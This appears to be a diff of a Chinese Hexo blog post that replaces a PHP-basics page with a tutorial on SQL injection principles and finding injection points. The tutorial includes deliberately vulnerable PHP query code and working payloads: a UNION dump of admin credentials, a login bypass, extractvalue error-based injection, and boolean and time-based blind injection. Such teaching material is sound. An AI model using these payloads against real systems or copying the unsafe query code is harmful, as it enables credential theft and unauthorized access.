@@ -6,46 +6,36 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>WEB安全基础(二) | Hexo</title>
+  <title>SQL注入原理与实践进阶 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="服务端脚本基础静态网页与动态网页（1）静态页面，即静态网页，是实际存在的，无需经过服务器的编译，直接加载到客户浏览器上显示出来。静态页面需要占一定的服务器空间，且不能自主管理发布更新的页面。 （2）动态页面则是以ASP、ASPX、PHP、JSP等，由相应的脚本引擎来解释执行，根据指令生成静态网页。 ​          动态页面上的内容存在于数据库中，根据用户发出的不同请求，其提供个性化的网页内容">
+  <meta name="description" content="SQL注入的原理动态页面有时会通过脚本引擎将用户输入的参数按照预先设定的规则构造成SQL语句来进行数据库操作，SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，改变原有的SQL语句的语义来执行攻击者所要的操作，其主要原因是程序没有采用必要的措施避免用户输入内容改变原有SQL语句的语义。 从程序编写的角度看SQL注入SQL注入漏洞产生的本质原因是将获取到的用户可控数据在没有经过安全处">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WEB安全基础(二)">
-<meta property="og:url" content="http://example.com/2020/12/26/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80(%E4%BA%8C)/index.html">
+<meta property="og:title" content="SQL注入原理与实践进阶">
+<meta property="og:url" content="http://example.com/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="服务端脚本基础静态网页与动态网页（1）静态页面，即静态网页，是实际存在的，无需经过服务器的编译，直接加载到客户浏览器上显示出来。静态页面需要占一定的服务器空间，且不能自主管理发布更新的页面。 （2）动态页面则是以ASP、ASPX、PHP、JSP等，由相应的脚本引擎来解释执行，根据指令生成静态网页。 ​          动态页面上的内容存在于数据库中，根据用户发出的不同请求，其提供个性化的网页内容">
+<meta property="og:description" content="SQL注入的原理动态页面有时会通过脚本引擎将用户输入的参数按照预先设定的规则构造成SQL语句来进行数据库操作，SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，改变原有的SQL语句的语义来执行攻击者所要的操作，其主要原因是程序没有采用必要的措施避免用户输入内容改变原有SQL语句的语义。 从程序编写的角度看SQL注入SQL注入漏洞产生的本质原因是将获取到的用户可控数据在没有经过安全处">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2020/12/26/PqLGshoaFpf8Vc4.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/26/4bSYiJCj9IGBHms.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/26/l2r7OuaxcVoyLjT.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/26/EHOnCwqbfkh8FpT.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/26/qgwT4RVxsoBFXfS.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/26/4sZ7hPrbRnqTIva.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/26/1bK2sX6JWvpFoCQ.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/26/p6QNkLcKsZrwg5i.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/WUZ3eGvINQJCnlT.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/M9dc7NvyPGBaUbg.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/onBa1mAVIOLfM85.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/PxGFUetMfmglOI4.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/9bBDrMq2fA3JXKh.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/SFuhmXac5DQ48E2.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/2F3X5vh1WozLGVT.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/WgMJ64cFa8hvl5B.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/gsv5e4f6WkrwUTN.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/JYNCheTFMkK2wzi.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/N8xrA5q2wlM3eK6.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/pvnqcXkR5i3WDsU.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/PjUBe1bpnXo6wiE.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/h3VcGn6eXlEgOUt.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/uZomrbMh7LBjIdY.png">
-<meta property="og:image" content="https://i.loli.net/2020/12/27/HEwQZUdjAmqLbih.png">
-<meta property="og:image" content="c:/Users/86177/AppData/Roaming/Typora/typora-user-images/image-20201227012152047.png">
-<meta property="article:published_time" content="2020-12-26T13:25:55.000Z">
-<meta property="article:modified_time" content="2021-04-23T12:07:30.333Z">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/PrFV5YDpbjoJUa8.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/wiyFLTR1EuBmsJg.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/4r2Vj7gG9L6NuQT.png">
+<meta property="og:image" content="c:/Users/86177/AppData/Roaming/Typora/typora-user-images/image-20210423172110563.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/qFYGkpnrQszyJUK.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/ESf3YZi76wldJCF.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/nlqosbjvWRXBi59.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/6OvbCryUKpWoDMh.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/A8XJ4hVqDHrg3sc.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/htUOibI7gH4QRcA.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/VW2uQz5rx4UHpiv.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/WrFHQOf7xXAzcVZ.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/YqhPbHlTLux1oE3.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/lBdabnu4yxCEhwV.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/TCYSLltKdFQJ1nu.png">
+<meta property="article:published_time" content="2021-04-18T01:41:12.000Z">
+<meta property="article:modified_time" content="2021-04-23T14:12:44.731Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="安全初级">
+<meta property="article:tag" content="安全进阶">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2020/12/26/PqLGshoaFpf8Vc4.png">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/23/PrFV5YDpbjoJUa8.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -181,209 +171,407 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-安全初级/WEB安全基础(二)" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-安全进阶/SQL注入原理与实践进阶" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      WEB安全基础(二)
+      SQL注入原理与实践进阶
     </h1>
   
 
         
-        <a href="/2020/12/26/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80(%E4%BA%8C)/" class="archive-article-date">
-  	<time datetime="2020-12-26T13:25:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-26</time>
+        <a href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/" class="archive-article-date">
+  	<time datetime="2021-04-18T01:41:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-18</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="服务端脚本基础"><a href="#服务端脚本基础" class="headerlink" title="服务端脚本基础"></a>服务端脚本基础</h2><h3 id="静态网页与动态网页"><a href="#静态网页与动态网页" class="headerlink" title="静态网页与动态网页"></a>静态网页与动态网页</h3><p>（1）静态页面，即静态网页，是实际存在的，无需经过服务器的编译，直接加载到客户浏览器上显示出来。静态页面需要占一定的服务器空间，且不能自主管理发布更新的页面。</p>
-<p>（2）动态页面则是以ASP、ASPX、PHP、JSP等，由相应的脚本引擎来解释执行，根据指令生成静态网页。</p>
-<p>​          动态页面上的内容存在于数据库中，根据用户发出的不同请求，其提供个性化的网页内容。</p>
-<p>​          动态页面内容不是存在于页面上，而是存在数据库中，从而大大降低网站的维护工作量。</p>
-<p>​          采用动态网页技术的网站可以实现更多的功能，如用户注册、用户登录、在线调查、用户管理、订单管理等等；静态页面则无法实现这些功能。</p>
-<p>（3）动态页面与静态页面的区别：</p>
-<p>静态页面：html或htm，是一种静态的页面格式，不需要服务器解析其中的脚本，由浏览器解析。</p>
-<p>动态页面：由相应的脚本引擎来解释执行，根据指令生成静态网页，如PHP、JSP、ASPX等。</p>
-<table>
+        <h2 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h2><p>动态页面有时会通过脚本引擎将用户输入的参数按照预先设定的规则构造成SQL语句来进行数据库操作，<strong>SQL注入攻击</strong>指的是通过<strong>构建特殊的输入作为参数传入Web应用程序，</strong>改变原有的SQL语句的语义来执行攻击者所要的操作，其主要原因是程序<strong>没有采用必要的措施避免用户输入内容改变原有SQL语句的语义。</strong></p>
+<h3 id="从程序编写的角度看SQL注入"><a href="#从程序编写的角度看SQL注入" class="headerlink" title="从程序编写的角度看SQL注入"></a>从程序编写的角度看SQL注入</h3><p>SQL注入漏洞产生的本质原因是<strong>将获取到的用户可控数据在没有经过安全处理的情况下拼接到SQL语句中并发送给数据库服务器执行导致的。</strong></p>
+<pre><code class="php">&lt;?php
+$con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,sqleasy);
+$newsid=$_GET[&#39;newsid&#39;];   //用户可控输入(GET情趣的newsid参数)
+
+//拼接到了发送数据库服务器执行的SQL语句中
+$result = mysqli_query($con,&quot;SELECT title,context FROM `news` WHERE newsid=&#39;$newsid&#39;&quot;);
+$row = mysqli_fetch_array($result);
+
+echo &quot;公告标题 : &quot;.$row[&#39;title&#39;].&quot;&lt;br/&gt;&quot;;
+echo &quot;公告内容 : &quot;.$row[&#39;context&#39;].&quot;&lt;br/&gt;&quot;;
+?&gt;</code></pre>
+<h3 id="SQL注入的常见场景"><a href="#SQL注入的常见场景" class="headerlink" title="SQL注入的常见场景"></a>SQL注入的常见场景</h3><h4 id="数据查询功能"><a href="#数据查询功能" class="headerlink" title="数据查询功能"></a>数据查询功能</h4><p>数据查询功能是WEB应用最常见的功能之一，实现方式就是<strong>根据用户提交的查询条件将数据库中的信息查询出来并显示在页面上，此时用户提交的数据通常被拼接到SQL语句的查询条件位置（即where之后）</strong>，这种情况下如果没有进行安全处理，使用<strong>联合查询注入</strong>的方式可以很方便的获取数据库的敏感信息。</p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//获取用户的查询条件：
+$newsid=$_GET[&#39;newsid&#39;];
+
+//构造SQL语句查询相关信息
+$result = mysqli_query($con,&quot;SELECT title,context 
+FROM `news` WHERE newsid=$newsid&quot;);
+
+//将结果显示在页面上：
+$row = mysqli_fetch_array($result);
+echo &quot;公告标题 : &quot;.$row[&#39;title&#39;].&quot;&lt;br/&gt;&quot;;
+echo &quot;公告内容 : &quot;.$row[&#39;context&#39;].&quot;&lt;br/&gt;&quot;</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<pre><code class="sql">联合查询注入
+http://127.0.0.1/sqleasy_webjj/news.php?newsid=0 union select username,password from admin;
+
+实际执行语句
+SELECT title,context FROM `news` WHERE newsid=0 union select username,password from admin;</code></pre>
+<h4 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h4><p>登录功能也是WEB应用的常见功能之一，通常的实现方式就是<strong>将用户输入的用户名和密码在数据库中查询，如果有匹配的结果说明用户名密码正确，即判断为登录成功，否则就登录失败。</strong>这个过程中用户输入的用户名和密码通常也会被拼接到SQL语句的查询条件位置（即where之后），这种情况下如果没有进行安全处理，<strong>攻击者可以插入恶意的SQL语句改变判断条件的结果，达到登录任意账号的目的（即通常说的万能密码攻击）。</strong></p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//获取用户输入的用户名和密码：
+$name=$_POST[&#39;username&#39;]; 
+$pwd=$_POST[&#39;password&#39;];
+
+//构造SQL语句查询admin表中是否有匹配的信息
+$result = mysqli_query($con,&quot;select * from admin 
+where username=&#39;$name&#39; and password=&#39;$pwd&#39;&quot;);
+
+//根据结果集是否为空判断账号密码是否存在
+$res=mysql_fetch_array($result); 
+if(is_array($res))&#123;
+$login=true;    
+&#125;else&#123; 
+   $login=false; &#125;</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/PrFV5YDpbjoJUa8.png" alt="image-20210423162120756"></p>
+<pre><code class="sql">实际执行语句
+select * from admin where username=&#39;jiaoshou&#39;or&#39;1&#39; and password=&#39;adjflajsdlfl&#39;</code></pre>
+<h4 id="程序将错误信息直接返回页面"><a href="#程序将错误信息直接返回页面" class="headerlink" title="程序将错误信息直接返回页面"></a>程序将错误信息直接返回页面</h4><p>为了方便程序调试，许多程序员会<strong>将SQL查询的报错信息直接回显到页面上。</strong>这种情况下黑客可以<strong>利用特殊的<br>函数或者语法构造错误的SQL语句，使得敏感数据通过报错信息直接回显到页面上。</strong>对于<strong>在线的WEB系统</strong>而言，<br>程序的<strong>错误信息应该记录到日志中</strong>，而不是显示在页面上。</p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//在SQL语句执行后打印报错信息，方便调试
+$result = mysqli_query($con,&quot;SELECT title,context FROM `news` WHERE newsid=&#39;$newsid&#39;&quot;);
+if(!empty(mysqli_error($con)))&#123; 
+    echo mysqli_error($con);
+&#125;
+
+//mysqli_error() 函数返回最近调用函数的最后一个错误描述。
+//empty($var) empty()用来检查变量var是否为空，若var为空则返回true，当var存在且是一个非空非零的值时返回false。</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/wiyFLTR1EuBmsJg.png" alt="image-20210423171401714"></p>
+<pre><code class="sql">实际执行语句：SELECT title,context FROM `news` WHERE newsid= 11 and extractvalue(1,concat(0x7e,(select database()),0x7e))</code></pre>
+<h4 id="基于查询条件返回判断结果"><a href="#基于查询条件返回判断结果" class="headerlink" title="基于查询条件返回判断结果"></a>基于查询条件返回判断结果</h4><p>有时候某些功能是<strong>根据用户输入的查询条件，去数据库中查询相关数据，但不会返回查询结果，而是根据查询<br>结果的情况返回某些信息。</strong>例如，根据学生学号查询成绩，根据查询到的分数返回是否及格（而不是具体分数）。<br>由于数据库中的信息不会直接返回到页面，<strong>无法使用联合查询注入</strong>，如果程序员<strong>也没有输出报错信息到页面上</strong>，那<br>么我们是无法直接通过SQL注入获取数据的。此时，<strong>可以采用盲注的方式来尝试获取数据。</strong></p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//获取用户输入的学生id
+$id = $_GET[&#39;id&#39;];
+//构造SQL语句查询info表中是否有匹配的信息
+$result = mysqli_query($con, &quot;SELECT score FROM `info` WHERE id=&#39;$id&#39;&quot;);
+$row = mysqli_fetch_array($result);
+//判断结果是否为空
+    if (is_array($row)) &#123;     //is_array用于检测变量是否为一个数组
+//判断成绩是否及格
+        if ($row[&#39;score&#39;] &gt;= 60) &#123;
+            echo &quot;$id 号同学，恭喜你，成绩及格了&quot;;
+        &#125; else &#123;echo &quot;$id 号同学，很遗憾，你没有及格&quot;;&#125;
+    &#125; else &#123;echo &quot;对不起，你输入的学号不存在&quot;;&#125;&#125;</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/4r2Vj7gG9L6NuQT.png" alt="image-20210423171310802"></p>
+<pre><code class="sql">--substr(string,1,1) 返回字符串的一部分。例如下方代码，返回从第1个到第1个字符
+-- 实际执行语句：
+SELECT score FROM `info` WHERE id=1024 and substr(database(),1,1)=&#39;s&#39;</code></pre>
+<h4 id="数据的插入、修改与删除功能"><a href="#数据的插入、修改与删除功能" class="headerlink" title="数据的插入、修改与删除功能"></a>数据的插入、修改与删除功能</h4><p>除了查询相关的功能以外，对数据库的数据进行数据插入、修改、删除操作也是常见的功能（insert、update<br>、delete），这些功能与查询语句不同的是并不会返回结果集数据（只会返回成功失败的状态码），如果又没有输<br>出报错信息，即使用户输入的数据没有进行安全处理，也难以使用联合查询、报错注入、布尔型盲注等方式注入，<br>这时，<strong>可以采用时间型盲注进行注入。</strong></p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//获取用户输入的信息
+$username = $_POST[&#39;username&#39;];
+$passwd = $_POST[&#39;passwd1&#39;];
+$question = $_POST[&#39;question&#39;];
+$answer = $_POST[&#39;answer&#39;];
+//构造SQL语句将用户输入的信息插入数据库
+$query = &quot;INSERT INTO 
+admin(role,username,password,question,answer) VALUES 
+(&#39;student&#39;,&#39;$username&#39;,&#39;$passwd&#39;,&#39;$question&#39;,&#39;$answer&#39;
+)&quot;;
+mysql_query($query) or die(&quot;Error!!&quot;);</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<p><img src="C:\Users\86177\AppData\Roaming\Typora\typora-user-images\image-20210423172110563.png" alt="image-20210423172110563"></p>
+<pre><code class="sql">--实际执行语句：
+INSERT INTO admin(role,username,password,question,answer) 
+VALUES (&#39;student&#39;,&#39;test2&#39;,&#39;test2&#39;,&#39;&#39;,if(left(database(),1)=&#39;s&#39;,sleep(3),0))#&#39;,&#39;ndsec&#39;)</code></pre>
+<h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><table>
 <thead>
 <tr>
-<th align="center">静态网页</th>
-<th align="center">动态网页</th>
+<th align="center">基于注入点位置分类</th>
+<th align="center">基于变量数据类型分类</th>
+<th align="center">基于获取数据的方法分类</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center">不依赖数据库</td>
-<td align="center">依赖数据库</td>
-</tr>
-<tr>
-<td align="center">灵活性差，制作、更新、维护麻烦</td>
-<td align="center">灵活性好，维护简单</td>
-</tr>
-<tr>
-<td align="center">在功能方面有较大的限制，交互性能差</td>
-<td align="center">交互性好，功能强大</td>
-</tr>
-<tr>
-<td align="center">服务端不处理用户输入，安全性高</td>
-<td align="center">服务端需要处理用户输入，安全性低</td>
+<td align="center">GET注入、POST注入、Cookie注入</td>
+<td align="center">字符型注入、数字型注入</td>
+<td align="center">基于回显、基于错误、盲注(布尔型盲注、基于时间盲注)</td>
 </tr>
 </tbody></table>
-<p>直接的区别是动态页面访问相同的页面，客户端获得的源代码可能不同。</p>
-<h3 id="常见的服务端脚本语言"><a href="#常见的服务端脚本语言" class="headerlink" title="常见的服务端脚本语言"></a>常见的服务端脚本语言</h3><p>（1）ASP：是动态服务器页面(Active Server Pages)的英文缩写，也称为经典ASP，动态产生Web页面。</p>
-<p>（2）ASPX：aspx文件是微软的在服务器端运行的动态网页文件,属于ASP.NET技术。ASP.NET是由微软在·NET Framework框架中所提供，开发Web应用程序的类库，封装在System.Web.dll文件中，显露出System.Web命名空间，并提供ASP.NET网页处理、扩充以及HTTP通道的应用程序与通信处理等工作，以及Web Service的基础架构。ASP.NET是ASP技术的后继者，但它的发展性要比ASP技术强大许多</p>
-<p>（3）JSP：全名为Java Server Pages，中文名叫java服务器页面，其根本是一个简化的Servle设计。</p>
-<p>（4）PHP(Hypertext Preprocessor超文本预处理器)是一种通用开源脚本语言，语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGl或者Perl更快速地执行动态网页。</p>
-<h3 id="PHP语法基础"><a href="#PHP语法基础" class="headerlink" title="PHP语法基础"></a>PHP语法基础</h3><p>（1）PHP文件的默认文件扩展名是”.php”</p>
-<p>（2）PHP脚本可以放置于文档中的任何位置</p>
-<p>（3）PHP文件通常包含HTML标签以及一些PHP脚本代码</p>
-<p>（4）PHP脚本以&lt;?php开头，以?&gt;结尾</p>
-<p>（5）PHP语句以分号结尾(;)</p>
-<p>（6）PHP使用//作为注释符号</p>
-<pre><code class="php">&lt;?php
-    //此处是PHP代码
-    ?&gt;</code></pre>
-<h3 id="PHP输出"><a href="#PHP输出" class="headerlink" title="PHP输出"></a>PHP输出</h3><p>（1）echo能够输出一个以上的字符串</p>
-<p>（2）echo是一个语言结构，有无括号均可使用：echo或echo()</p>
-<p>（3）实例：用echo命令来显示不同的字符串(注意：字符串中能包含HTML标记)</p>
-<pre><code class="php">&lt;?php
-echo &quot;&lt;h2&gt;PHP很有趣!&lt;/h2&gt;&quot;;
-echo &quot;Hello world!&lt;br&gt;&quot;;
-echo &quot;我计划学习PHP! &lt;br&gt;&quot;;
-echo &quot;这段话&quot;,&quot;由&quot;,&quot;多个&quot;,&quot;字符串&quot;,&quot;串接而成。&quot;;
-?&gt;</code></pre>
-<p><img src="https://i.loli.net/2020/12/26/PqLGshoaFpf8Vc4.png" alt="image-20201226220748663"></p>
-<h3 id="PHP与HTML结合"><a href="#PHP与HTML结合" class="headerlink" title="PHP与HTML结合"></a>PHP与HTML结合</h3><pre><code class="php">&lt;!DOCTYPE html&gt; 
-&lt;html&gt; 
-&lt;body&gt; 
-    &lt;h1&gt;我的第一张PHP页面&lt;/h1&gt;
-&lt;?php 
-echo &quot;Hello World!&quot;; 
-?&gt; 
+<h2 id="SQL注入点的查找与判断"><a href="#SQL注入点的查找与判断" class="headerlink" title="SQL注入点的查找与判断"></a>SQL注入点的查找与判断</h2><h3 id="SQL注入测试方法"><a href="#SQL注入测试方法" class="headerlink" title="SQL注入测试方法"></a>SQL注入测试方法</h3><p>SQL注入漏洞的测试主要包括<strong>寻找可能的注入点</strong>以及<strong>针对可能的注入点进行测试</strong>两个环节，核心思路和流程如下：</p>
+<p><img src="https://i.loli.net/2021/04/23/qFYGkpnrQszyJUK.png" alt="image-20210423172821267"></p>
+<h3 id="寻找可能的注入点"><a href="#寻找可能的注入点" class="headerlink" title="寻找可能的注入点"></a>寻找可能的注入点</h3><h4 id="服务器能取到的用户输入"><a href="#服务器能取到的用户输入" class="headerlink" title="服务器能取到的用户输入"></a>服务器能取到的用户输入</h4><p>（1）<strong>任何服务器能取到的用户输入，都是可能存在SQL注入的注入点，</strong>对于手工测试而言，通常根据业务找寻可能与数据库有交互的输入作为潜在的注入点进行测试。</p>
+<p>（2）常见注入点：</p>
+<ul>
+<li>表单提交，主要是POST请求，也包括GET请求。</li>
+<li>URL参数提交，主要为GET请求参数。</li>
+<li>Cookie参数提交。</li>
+<li>HTTP请求头部可修改的值，比如：Referer、User_Agent等。</li>
+<li>边缘的输入点，比如.mp3文件的一些文件信息等。</li>
+</ul>
+<p><strong>PS：以PHP为例，通过各类超全局变量可以取到各类用户输入，这些都是潜在的注入点</strong></p>
+<h4 id="常见的注入点"><a href="#常见的注入点" class="headerlink" title="常见的注入点"></a>常见的注入点</h4><ul>
+<li>GET请求和POST请求的参数值是最常见的注入点，是测试时需要重点关注的地方。</li>
+<li>除了标准的请求参数值，采用一些特殊数据传输格式的参数值也有可能存在注入点，如JSON或XML格式传输的参<br>数值。</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/ESf3YZi76wldJCF.png" alt="image-20210423181050875"></p>
+<p><img src="https://i.loli.net/2021/04/23/nlqosbjvWRXBi59.png" alt="image-20210423181119960"></p>
+<ul>
+<li>Cookie中的一些字段有时也会用于数据库查询或其他操作，往往也是需要关注的潜在注入点。</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/6OvbCryUKpWoDMh.png" alt="image-20210423181155681"></p>
+<ul>
+<li>HTTP请求头部的其他字段也可能存在注入点，如refer字段有时会被写入数据库。</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/A8XJ4hVqDHrg3sc.png" alt="image-20210423181231673"></p>
+<h3 id="SQL注入点的测试"><a href="#SQL注入点的测试" class="headerlink" title="SQL注入点的测试"></a>SQL注入点的测试</h3><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>SQL注入点的测试本质上是基于原理的模糊测试，我们需要根据一个注入点的功能，推测其可能使用的SQL操作、用户输入的数据类型（数字型或字符型）以及用户输入拼接到SQL语句的位置，并尝试构造基础的报错注入语句、布尔盲注或时间盲注语句来验证相关位置是否存在sql注入漏洞。</p>
+<p><strong>注意：在未知源码的情况下，我们只能尽可能尝试构造各类测试语句来对注入点进行测试，如果测试现象符合条件可以认为存在SQL注入漏洞，但测试现象不符合预期并不能100%确定SQL注入漏洞不存在。</strong></p>
+<p><img src="https://i.loli.net/2021/04/23/htUOibI7gH4QRcA.png" alt="image-20210423184225134"></p>
+<h4 id="构造报错注入语句"><a href="#构造报错注入语句" class="headerlink" title="构造报错注入语句"></a>构造报错注入语句</h4><p>在进行SQL注入点测试的时候，<strong>构造报错注入语句是第一步，</strong>报错注入语句的构造相对简单，通常<strong>只要在参数值中增加一些常见的符号就可以让SQL语句产生语法错误</strong>，常见可使用的符号包括单引号、双引号、括号、分号、冒号、斜杠、反斜杠等，可以将这些符号<strong>组合使用</strong>进行尝试。</p>
+<p><img src="https://i.loli.net/2021/04/23/VW2uQz5rx4UHpiv.png" alt="image-20210423184705988"></p>
+<h4 id="报错注入结果判断"><a href="#报错注入结果判断" class="headerlink" title="报错注入结果判断"></a>报错注入结果判断</h4><p>（1）<strong>出现数据库原始报错信息，可以确定存在SQL注入漏洞.</strong></p>
+<p><img src="https://i.loli.net/2021/04/23/WrFHQOf7xXAzcVZ.png" alt="image-20210423184915060"></p>
+<p><img src="https://i.loli.net/2021/04/23/YqhPbHlTLux1oE3.png" alt="image-20210423184815009"></p>
+<p>（2）在输入某些测试payload时导致页面显示异常，包括结果显示异常或出现通用报错信息，都有可能是SQL注入漏洞但也有可能是系统正常的错误处理机制导致的，需要进一步测试。对于没有回显的语句（如插入、修改功能），可以<strong>根据操作结果返回包的状态码、包长度等信息推测SQL语句是否出错。</strong></p>
+<h4 id="布尔型盲注语句的构造"><a href="#布尔型盲注语句的构造" class="headerlink" title="布尔型盲注语句的构造"></a>布尔型盲注语句的构造</h4><p>（1）布尔型盲注语句需要在涉及判断的功能中才能使用，其中最常见的就是在查询条件的位置，分别拼接上一段结果为真和结果为假的判断语句，如果<strong>结果为真时显示效果与原来一致，结果为假时查询不到数据或与原来数据不一致，则认为存在布尔型盲注。</strong></p>
+<p>（2）布尔型盲注的本质就是构造两个分别为真和假的表达式，只要符按照这个思路，可以任意进行构造。</p>
+<p><img src="https://i.loli.net/2021/04/23/lBdabnu4yxCEhwV.png" alt="image-20210423185446985"></p>
+<p><img src="https://i.loli.net/2021/04/23/TCYSLltKdFQJ1nu.png" alt="image-20210423185511489"></p>
+<h4 id="时间型盲注语句构造"><a href="#时间型盲注语句构造" class="headerlink" title="时间型盲注语句构造"></a>时间型盲注语句构造</h4><p>（1）对于没有涉及判断的功能，如插入、更新等语句的数据位置（而非条件语句的位置），或者布尔型盲注的结果无法判断的（如显示均正常或均异常），可以尝试使用时间型盲注语句进行测试，<strong>如果插入时间型盲注语句后服务器延时响应，则认为存在SQL注入漏洞。</strong></p>
+<p>（2）与其他测试方式不同的是，时间型盲注依赖于时间相关函数或语法，每个数据库的函数并不相同只能进行尝试。<br>在实际使用中，通常有直接调用延时函数（或语法）和调用耗时较高的函数（或语法）两种方式：</p>
+<table>
+<thead>
+<tr>
+<th align="center">直接调用延时函数（或语法）</th>
+<th align="center">调用耗时较高的函数（或语法）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">MySQL和SQLserver提供了可直接调用的延时函数和语法，如MySQL的sleep()函数和SQLserver的waitfor()语法可直接调用</td>
+<td align="center">针对其他数据库或延时函数(语法)不适用时可以尝试调用耗时较高的函数或语法。如：select BENCHMARK(10000000,MD5(‘a’));</td>
+</tr>
+</tbody></table>
+<p>（3）Mysql：SLEEP函数可以实现延迟，在所有数据位置均可以使用:</p>
+<pre><code>对于数字型SQL注入，通常直接拼接判断语句即可
+SELECT title,context FROM `news` WHERE newsid= 11 and sleep(10)
+对于字符型SQL注入点，通常需要使用单引号或双引号闭合原有的单双引号才能进行拼接
+SELECT score FROM `info` WHERE name=&#39;lilei&#39;and sleep(10) and &#39;1&#39;</code></pre>
+<p>（4）SQLserver：WAITFOR DELAY 语句可以实现，通常需要跟在条件判断语句之后:</p>
+<pre><code>对于数字型SQL注入，通常直接拼接判断语句即可
+SELECT title,context FROM `news` WHERE newsid= 11 waitfor delay &#39;0:0:4&#39;
+对于字符型SQL注入点，通常需要使用单引号或双引号闭合原有的单双引号才能进行拼接
